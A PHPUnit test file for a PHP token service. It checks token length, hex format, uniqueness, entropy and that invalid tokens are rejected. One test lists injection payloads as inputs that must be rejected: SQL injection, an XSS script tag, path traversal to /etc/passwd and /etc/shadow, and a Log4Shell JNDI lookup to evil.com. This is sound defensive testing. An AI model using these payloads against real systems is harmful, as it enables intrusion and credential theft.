<?php

namespace Tests\Integration\Utils;

use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Test;
use App\Infrastructure\Service\TokenService;
use App\Infrastructure\Service\SessionService;
use Core\Database\Database;
use App\Domain\Auth\Exception\InvalidTokenException;
use App\Infrastructure\Exception\TokenCreationException;

/**
 * Integration Test for TokenService
 */
#[CoversClass(TokenService::class)]
#[CoversClass(SessionService::class)]
#[CoversClass(Database::class)]
#[CoversClass(InvalidTokenException::class)]
class TokenServiceIntegrationTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        $_SESSION = [];
    }

    protected function tearDown(): void
    {
        $_SESSION = [];
        parent::tearDown();
    }

    // ========================================
    // Token generation and validation for valid tokens
    // ========================================
    #[Test]
    public function generatedTokenCanBeValidated(): void
    {
        $token = TokenService::generateRandomTokenValue();

        $this->assertIsString($token);
        $this->assertEquals(64, strlen($token));
        $this->assertMatchesRegularExpression('/^[a-f0-9]{64}$/i', $token);
    }

    #[Test]
    public function multipleTokensAreAllUnique(): void
    {
        $tokens = [];
        $count = 1000;

        for ($i = 0; $i < $count; $i++) {
            $tokens[] = TokenService::generateRandomTokenValue();
        }

        $uniqueTokens = array_unique($tokens);

        $this->assertCount($count, $uniqueTokens, 'All generated tokens must be unique');
    }

    // ========================================
    // Cryptographic security tests
    // ========================================
    #[Test]
    public function tokensHaveHighEntropy(): void
    {
        $token = TokenService::generateRandomTokenValue();

        // Convert to binary for analysis
        $binary = hex2bin($token);

        // Count unique bytes
        /**
 * @var string $binary
*/
        $uniqueBytes = count(array_unique(str_split($binary)));

        // At least 20 different bytes out of 32 (good entropy)
        $this->assertGreaterThan(20, $uniqueBytes);
    }

    #[Test]
    public function tokensAreNotSequential(): void
    {
        $token1 = TokenService::generateRandomTokenValue();
        $token2 = TokenService::generateRandomTokenValue();

        // Compute Hamming distance
        $diff = 0;
        for ($i = 0; $i < strlen($token1); $i++) {
            if ($token1[$i] !== $token2[$i]) {
                $diff++;
            }
        }

        // At least 50% of characters must differ
        $this->assertGreaterThan(32, $diff);
    }

    // ========================================
    // Token format validation tests
    // ========================================
    #[Test]
    public function validTokenFormatIsAccepted(): void
    {
        $token = TokenService::generateRandomTokenValue();

        // A valid token should not throw an exception during format validation
        $this->assertIsString($token);
        $this->assertEquals(64, strlen($token));
    }

    #[Test]
    public function invalidTokenFormatsAreRejected(): void
    {
        $invalidTokens = [
            '',                                      // Empty
            'short',                                 // Too short
            str_repeat('a', 65),                     // Too long
            str_repeat('g', 64),                     // Non-hex characters
            str_repeat('a', 63),                     // Almost correct
            '<script>' . str_repeat('a', 56) . '</script>', // Contains HTML
            str_repeat('a', 32) . "\n" . str_repeat('a', 32), // Contains newline
        ];

        foreach ($invalidTokens as $invalidToken) {
            try {
                TokenService::validateToken($invalidToken);
                $this->fail('Should have thrown exception for invalid token: ' . substr($invalidToken, 0, 20));
            } catch (InvalidTokenException $e) {
                $this->assertInstanceOf(InvalidTokenException::class, $e);
            }
        }
    }


    #[Test]
    public function tokenValidationRejectsInjectionAttempts(): void
    {
        $injectionAttempts = [
            "'; DROP TABLE tokens--",
            '<script>alert("XSS")</script>',
            '../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            '../../../etc/shadow',
        ];

        foreach ($injectionAttempts as $attempt) {
            try {
                TokenService::validateToken($attempt);
                $this->fail('Should have rejected injection attempt: ' . $attempt);
            } catch (InvalidTokenException $e) {
                $this->assertInstanceOf(InvalidTokenException::class, $e);
            }
        }
    }

    // ========================================
    // Statistical distribution tests
    // ========================================
    #[Test]
    public function tokensHaveUniformDistribution(): void
    {
        $tokens = [];
        $charCount = array_fill_keys(str_split('0123456789abcdef'), 0);

        for ($i = 0; $i < 100; $i++) {
            $token = strtolower(TokenService::generateRandomTokenValue());
            $tokens[] = $token;

            // Count each character
            foreach (str_split($token) as $char) {
                $charCount[$char]++;
            }
        }

        // Calculate distribution
        $total = array_sum($charCount);
        $expected = $total / 16; // 16 possible hex characters

        foreach ($charCount as $char => $count) {
            // Each character should appear about 1/16th of the time (±30%)
            $this->assertGreaterThan($expected * 0.7, $count, "Character '$char' underrepresented");
            $this->assertLessThan($expected * 1.3, $count, "Character '$char' overrepresented");
        }
    }

    // ========================================
    // Robustness tests
    // ========================================
    #[Test]
    public function tokenGenerationHandlesConcurrentRequests(): void
    {
        // Simulate concurrent generations
        $tokens = [];

        for ($i = 0; $i < 100; $i++) {
            $tokens[] = TokenService::generateRandomTokenValue();
        }

        // All must be unique
        $this->assertCount(100, array_unique($tokens));
    }

    #[Test]
    public function tokenServiceHandlesMemoryEfficiently(): void
    {
        $memoryBefore = memory_get_usage();

        $tokens = [];
        for ($i = 0; $i < 1000; $i++) {
            $tokens[] = TokenService::generateRandomTokenValue();
        }

        $memoryAfter = memory_get_usage();
        $memoryUsed = $memoryAfter - $memoryBefore;

        // Less than 1MB for 1000 tokens
        $this->assertLessThan(1024 * 1024, $memoryUsed);

        unset($tokens);
    }

    // ========================================
    // Edge case tests
    // ========================================
    #[Test]
    public function tokenGenerationWorksAfterManyIterations(): void
    {
        $lastToken = null;

        for ($i = 0; $i < 10000; $i++) {
            $token = TokenService::generateRandomTokenValue();

            $this->assertNotEquals($lastToken, $token);
            $lastToken = $token;
        }

        // The last token should still be valid
        $this->assertEquals(64, strlen($lastToken));
        $this->assertMatchesRegularExpression('/^[a-f0-9]{64}$/i', $lastToken);
    }

    #[Test]
    public function tokenValidationHandlesEdgeCases(): void
    {
        $edgeCases = [
            str_repeat('0', 64),         // All zeros
            str_repeat('f', 64),         // All f's
            str_repeat('a5', 32),        // Repeated pattern
        ];

        foreach ($edgeCases as $token) {
            try {
                TokenService::validateToken($token);
            } catch (InvalidTokenException $e) {
                // Expected - these tokens should not exist in DB
                $this->assertInstanceOf(InvalidTokenException::class, $e);
            }
        }
    }

    // ========================================
    // Consistency tests
    // ========================================
    #[Test]
    public function tokenFormatIsConsistent(): void
    {
        $tokens = [];
        for ($i = 0; $i < 100; $i++) {
            $tokens[] = TokenService::generateRandomTokenValue();
        }

        foreach ($tokens as $token) {
            // All must have the same format
            $this->assertEquals(64, strlen($token));
            $this->assertMatchesRegularExpression('/^[a-f0-9]{64}$/i', $token);

            // All should be consistently lowercase OR uppercase (not mixed)
            $lower = strtolower($token);
            $upper = strtoupper($token);
            $this->assertTrue($token === $lower || $token === $upper);
        }
    }
}
